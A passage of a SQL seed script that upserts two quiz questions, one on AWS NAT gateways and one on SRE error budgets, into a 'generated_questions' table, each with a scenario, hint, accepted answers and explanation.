  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000005-0000-4000-8000-000000000013', 'What AWS VPC networking gateway translates private subnet IP addresses to a public IP to enable outbound internet access while blocking inbound traffic?', 'DevOps & Cloud Infrastructure', ARRAY['devops', 'vpc', 'networking', 'nat-gateway', 'subnets', 'sector-5']::text[], 'Advanced', 'The Private Subnet Egress Valve', 'Database servers in a private VPC subnet without public IPs must download security patches from external OS repositories without exposing incoming ports.', '// Private Subnet Route Table:
// 0.0.0.0/0 -> nat-0abc1234def
// WHAT MANAGED GATEWAY IS THIS?', ARRAY['nat gateway', 'nat', 'nat-gateway', 'network address translation gateway']::text[], 'Network Address Translation Gateway.', 'A NAT Gateway enables outbound internet access for instances in a private subnet while shielding them from inbound connections originating from the internet.', 5
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000005-0000-4000-8000-000000000014', 'In Site Reliability Engineering (SRE), what term describes the allowable room for unreliability (100% - SLO) that teams can spend on velocity?', 'DevOps & Cloud Infrastructure', ARRAY['devops', 'sre', 'error-budget', 'slo', 'sli', 'reliability', 'sector-5']::text[], 'Expert', 'The SRE Error Budget Threshold', 'The facility reliability SLA is 99.9% uptime. Frequent reckless deployments exhausted the acceptable failure threshold, halting all new feature rollouts.', '// If SLO is 99.9% availability, the remaining 0.1% downtime represents the team''s:
// WHAT SRE TERM DESCRIBES THIS ALLOWANCE?', ARRAY['error budget', 'error-budget', 'the error budget']::text[], 'A "budget" for allowable "errors".', 'An Error Budget (100% minus SLO target) sets a quantifiable boundary balancing innovation speed against system stability.', 5
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

